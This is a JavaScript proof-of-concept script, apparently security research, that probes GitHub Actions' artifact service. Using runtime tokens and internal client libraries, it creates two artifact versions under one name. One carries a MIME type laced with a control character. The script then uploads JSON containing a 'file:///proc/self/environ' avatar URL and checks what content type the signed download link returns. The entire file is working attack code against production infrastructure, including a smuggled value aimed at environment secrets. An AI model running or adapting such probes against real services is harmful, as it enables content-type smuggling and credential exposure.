import { createHash } from 'node:crypto';
import { BlobClient } from '@azure/storage-blob';
import { internalArtifactTwirpClient } from './node_modules/@actions/artifact/lib/internal/shared/artifact-twirp-client.js';
import { getBackendIdsFromToken } from './node_modules/@actions/artifact/lib/internal/shared/util.js';
import { StringValue } from './node_modules/@actions/artifact/lib/generated/index.js';
const ghToken=process.env.GH_TOKEN;
if(!process.env.ACTIONS_RUNTIME_TOKEN||!ghToken)throw new Error('runtime credentials unavailable');
const ids=getBackendIdsFromToken(),client=internalArtifactTwirpClient(),repo=process.env.GITHUB_REPOSITORY;
const weird='\u0085application/json',safe='application/json',placeholder=Buffer.from('{"p":1}'),digest=createHash('sha256').update(placeholder).digest('hex');
async function create(name,version,mime){const c=await client.CreateArtifact({workflowRunBackendId:ids.workflowRunBackendId,workflowJobRunBackendId:ids.workflowJobRunBackendId,name,version,mimeType:StringValue.create({value:mime})});if(!c.ok||!c.signedUploadUrl)throw new Error('create rejected');return c;}
async function run(label,pair){
 const name=`seq-v6v7-${process.env.GITHUB_RUN_ID}-${label}`;
 let created=[];
 try{
  created.push(await create(name,pair[0][0],pair[0][1]));
  created.push(await create(name,pair[1][0],pair[1][1]));
  for(const c of created)await new BlobClient(c.signedUploadUrl).getBlockBlobClient().uploadData(placeholder,{blobHTTPHeaders:{blobContentType:'application/json'}});
  const f=await client.FinalizeArtifact({workflowRunBackendId:ids.workflowRunBackendId,workflowJobRunBackendId:ids.workflowJobRunBackendId,name,size:String(placeholder.length),hash:StringValue.create({value:`sha256:${digest}`})});
  if(!f.ok)throw new Error('finalize rejected');
  const id=String(f.artifactId),body=Buffer.from(JSON.stringify({full_name:`${repo}/actions/artifacts/${id}/zip`,owner:{login:'cassette',avatar_url:'file:///proc/self/environ'}}));
  for(const c of created)await new BlobClient(c.signedUploadUrl).getBlockBlobClient().uploadData(body,{blobHTTPHeaders:{blobContentType:'application/json'}});
  const r=await fetch(`https://api.github.com/repos/${repo}/actions/artifacts/${id}/zip`,{redirect:'manual',headers:{authorization:`Bearer ${ghToken}`,accept:'application/vnd.github+json','user-agent':'repo-cassette-sequential-own-probe'}});
  const loc=r.headers.get('location');if(!loc)throw new Error(`rest ${r.status} no redirect`);
  const parsed=new URL(loc),raw=await fetch(loc),bytes=Buffer.from(await raw.arrayBuffer());
  console.log(JSON.stringify({label,order:pair.map(x=>x[0]),id,rsct:parsed.searchParams.get('rsct'),rawType:raw.headers.get('content-type'),exact:bytes.equals(body),bytes:bytes.length}));
 }catch(e){console.log(JSON.stringify({label,order:pair.map(x=>x[0]),created:created.length,error:String(e?.message||e).slice(0,200)}));}
}
await run('v6-then-v7',[[6,weird],[7,safe]]);
await run('v7-then-v6',[[7,safe],[6,weird]]);
